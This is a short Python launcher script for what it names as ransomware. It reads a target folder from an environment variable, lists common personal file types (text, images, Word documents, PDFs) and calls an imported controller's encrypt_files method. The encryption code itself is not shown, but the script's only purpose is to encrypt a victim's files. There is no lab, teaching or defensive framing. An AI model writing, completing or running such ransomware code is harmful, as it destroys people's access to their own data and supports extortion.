from controllers.ransomware_controller import RansomwareController
import os
from dotenv import load_dotenv

def main():
    load_dotenv()
    destination = os.getenv('FOLDER_DESTINATION')
    extensions = [".txt", ".jpg", ".png", ".docx", ".pdf"]

    ransomware = RansomwareController(destination, extensions)


    ransomware.encrypt_files()

if __name__ == '__main__':
    main()
